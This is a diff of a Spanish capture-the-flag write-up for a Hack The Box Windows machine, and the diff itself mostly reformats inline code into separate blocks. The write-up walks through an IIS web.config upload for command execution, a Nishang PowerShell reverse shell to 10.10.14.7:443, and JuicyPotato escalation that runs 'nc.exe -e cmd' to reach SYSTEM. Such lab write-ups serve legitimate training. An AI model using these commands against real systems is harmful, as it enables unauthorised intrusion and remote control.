@@ -68,21 +68,41 @@ Vemos una imagen de Merlin ;)
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.93/FUZZ
 ```
 
-Encontramos una routa `uploadedFiles`, probamos con una extension `.aspx` porque es un IIS
+Encontramos una routa 
+```bash
+ uploadedFiles 
+```
+, probamos con una extension 
+```bash
+ .aspx 
+```
+ porque es un IIS
 
 ```bash
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.93/FUZZ.aspx
 ```
 
-Encontramos una routa `transfer.aspx`
+Encontramos una routa 
+```bash
+ transfer.aspx 
+```
+
 
 Si la analyzamos con firefox, vemos una pagina que nos permite subir ficheros.
 ## Vulnerability Assessment {-}
 
 ### Vulnerabilidad IIS en file upload {-}
 
-Buscamos en internet sobre la busqueda `iis upload exploit`. Encontramos una pagina interesante en [ivoidwarranties](https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/).
-Uploadeando un fichero `web.config` podriamos ejecutar comandos a nivel de systema.
+Buscamos en internet sobre la busqueda 
+```bash
+ iis upload exploit 
+```
+. Encontramos una pagina interesante en [ivoidwarranties](https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/).
+Uploadeando un fichero 
+```bash
+ web.config 
+```
+ podriamos ejecutar comandos a nivel de systema.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -113,7 +133,11 @@ Response.write("<!-"&"-")
 -->
 ```
 
-Lo subimos en la red y controlamos en la routa `http://10.10.10.93/uploadedFiles/web.config`
+Lo subimos en la red y controlamos en la routa 
+```bash
+ http://10.10.10.93/uploadedFiles/web.config 
+```
+
 
 Aqui vemos que el codigo se a ejecutado. Ahora necessitamos ver si podemos ejecutar codigo a nivel de systema.
 
@@ -151,7 +175,11 @@ Response.write(output)
 -->
 ```
 
-Nos ponemos en escucha de trazas ICMP `tcpdump -i tun0 icmp -n` y enviamos el fichero nuevamente y vemos que recibimos la traza ICMP.
+Nos ponemos en escucha de trazas ICMP 
+```bash
+ tcpdump -i tun0 icmp -n 
+```
+ y enviamos el fichero nuevamente y vemos que recibimos la traza ICMP.
 ## Vuln exploit & Gaining Access {-}
 
 ### Ganando accesso con un web.config {-}
@@ -168,7 +196,11 @@ Aqui trabajaremos con Nishang porque nos queremos entablar una PowerShell.
     nano PS.ps1
     ```
 
-    Modificamos el fichero PS.ps1 para añadir `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443` al final del fichero
+    Modificamos el fichero PS.ps1 para añadir 
+```bash
+ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443 
+```
+ al final del fichero
 
 1. Modificamos el web.config para que descarge el fichero PS.ps1 al momento que lo lanzemos.
 
@@ -215,7 +247,11 @@ Aqui trabajaremos con Nishang porque nos queremos entablar una PowerShell.
     rlwrap nc -nlvp 443
     ```
 
-1. Navigamos al url `http://10.10.10.93/uploadedFiles/web.config`
+1. Navigamos al url 
+```bash
+ http://10.10.10.93/uploadedFiles/web.config 
+```
+
 
 Y vemos que ganamos accesso al systema
 
@@ -234,7 +270,11 @@ systeminfo
 whoami /priv
 ```
 
-Aqui vemos que tenemos el `SeImpersonatePrivilege` ;)
+Aqui vemos que tenemos el 
+```bash
+ SeImpersonatePrivilege 
+```
+ ;)
 
 Tiramos como siempre de JuicyPotatoe.exe
 
@@ -270,11 +310,19 @@ Nos connectamos con el servicio nc con el JuicyPotato.
 
 Aqui nos sale une error 10038. Esto suele passar cuando el CLSID no es el correcto. Como savemos con el systeminfo
 que estamos en una maquina Windows10 Enterprise, podemos buscar el CLSID correcto en [Interesting CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
-encontramos el CLSID que corresponde y con el parametro `-c`
+encontramos el CLSID que corresponde y con el parametro 
+```bash
+ -c 
+```
+
 
 ```bash
 ./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.7 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
 ```
 
-La reverse shell nos a functionnado y con `whoami` vemos que ya somos nt authority\system y podemos ver la flag.
+La reverse shell nos a functionnado y con 
+```bash
+ whoami 
+```
+ vemos que ya somos nt authority\system y podemos ver la flag.
 
